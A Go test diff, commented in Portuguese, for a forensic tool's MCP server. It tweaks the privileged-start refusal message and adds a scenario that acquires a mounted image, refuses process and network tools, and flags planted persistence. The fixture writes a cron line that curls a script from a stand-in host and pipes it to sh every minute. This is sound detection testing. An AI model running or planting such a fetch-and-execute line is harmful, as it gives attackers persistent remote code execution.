@@ -214,7 +214,7 @@ func init() {
 		// Sem --allow-root, de propósito.
 		Args: []string{"--snapshot", "/tmp/retrato.json"},
 		ExpectOutput: []string{
-			"recusei iniciar como root",
+			"recusei iniciar com observação privilegiada",
 			// A recusa precisa ENSINAR o caminho, senão ela só atrapalha.
 			"--allow-root",
 			// E avisar do stdin, que é o canal do protocolo: um sudo interativo
@@ -540,9 +540,102 @@ func init() {
 		Cmd:    "mcp",
 		Args:   []string{"--live"},
 		ExpectOutput: []string{
-			"recusei iniciar como root",
+			// O portão passou a medir PRIVILÉGIO EFETIVO, e não euid: um uid=1000
+			// com CAP_DAC_READ_SEARCH lê /etc/shadow, e o session.status do mesmo
+			// binário já dizia isso em prosa enquanto o portão conferia outra
+			// coisa.
+			"recusei iniciar com observação privilegiada",
 			"--allow-root",
 		},
 		Exit: 3,
+	})
+
+	// M13 — a AQUISIÇÃO de imagem montada, que é um terceiro caminho.
+	//
+	// O M9 já prova `source: image`, mas servindo um ARTEFATO: o dump foi
+	// coletado com --root em outro momento, e o servidor só o lê. Aqui o
+	// servidor monta o ambiente e varre o filesystem AGORA — é o modo em que
+	// não existe /proc, não existe processo e não existe socket, e em que o
+	// kernel é o do analista.
+	//
+	// É também o único modo onde uma tool de processo estaria respondendo sobre
+	// a máquina ERRADA se existisse: o /proc alcançável ali é o do contêiner que
+	// investiga, não o da imagem investigada.
+	Register(Scenario{
+		ID:     "M13-mcp-imagem-montada-adquire-e-recusa-o-que-nao-existe",
+		Desc:   "aquisição sobre --root: escopo completo, achado de persistência, e nenhuma tool de processo ou rede",
+		Images: []string{"debian:12"},
+		Cmd:    "mcp",
+		Plant: `mkdir -p /alvo/etc/cron.d /alvo/etc/systemd/system /alvo/etc/ssh \
+			/alvo/root/.ssh /alvo/usr/bin /alvo/tmp/.cache
+		printf 'root:x:0:0:root:/root:/bin/sh\n' > /alvo/etc/passwd
+		printf '127.0.0.1 localhost\n' > /alvo/etc/hosts
+		# a persistência: um cron de minuto em minuto que baixa e executa
+		printf '* * * * * root /bin/sh -c "curl -s http://198.51.100.7/p | sh"\n' \
+			> /alvo/etc/cron.d/telemetry
+		sleep 0.2`,
+		Args: []string{"--root", "/alvo", "--allow-root"},
+		MCP: []Chamada{
+			{
+				Tool: "snapshot.capture",
+				Args: `{"scope":"complete"}`,
+				Campos: map[string]string{
+					// A procedência é da IMAGEM, e não do contêiner que investiga.
+					"provenance.source": "image",
+					// E o alcance viaja junto: desde a Fase 2 existem retratos de
+					// alcances diferentes, e `source` sozinho já não diz o que uma
+					// resposta significa.
+					"provenance.scope":       "complete",
+					"data.scope":             "complete",
+					"data.supports_findings": "true",
+					"provenance.sidecar":     "sidecar_not_applicable",
+					"provenance.redaction":   "applied",
+				},
+			},
+			{
+				// scope é OBRIGATÓRIO e não tem padrão: escolher por quem chama
+				// cobraria a varredura inteira de quem só esqueceu um argumento.
+				Tool:       "snapshot.capture",
+				Args:       `{}`,
+				ErroDeTool: true,
+				Espera:     []string{"scope é obrigatório"},
+			},
+			{
+				// E o volátil não se aplica a uma imagem: ele é /proc e sockets,
+				// que ali não existem. Recusa, nunca um retrato vazio.
+				Tool:       "snapshot.capture",
+				Args:       `{"scope":"volatile"}`,
+				ErroDeTool: true,
+				Espera:     []string{"uma imagem montada não tem nenhum dos dois"},
+			},
+			{
+				ProibeTool: []string{
+					"process.get", "process.tree", "process.census",
+					"net.census", "net.ip", "net.port",
+				},
+				Espera: []string{
+					`"file.inspect"`, `"findings.list"`, `"snapshot.capture"`,
+				},
+			},
+			{
+				Tool:   "findings.list",
+				Args:   `{"min_severity":"WARN"}`,
+				Espera: []string{"persist.cron_suspect"},
+				CampoNao: map[string]string{
+					// A imagem tem um cron de invasor: chamar isto de OK seria a
+					// única mentira que esta ferramenta existe para não contar.
+					"observability.verdict": "OK",
+				},
+			},
+			{
+				// O orçamento de TRABALHO é publicado antes de ser batido: o teto
+				// de retratos vivos limita memória, e capturar-liberar em laço
+				// nunca esbarra nele enquanto cobra uma varredura por volta.
+				Tool:   "session.status",
+				Espera: []string{`"capture_budget"`, `"reclaimable":false`},
+				Campos: map[string]string{"data.mode": "image"},
+			},
+		},
+		Exit: 0,
 	})
 }
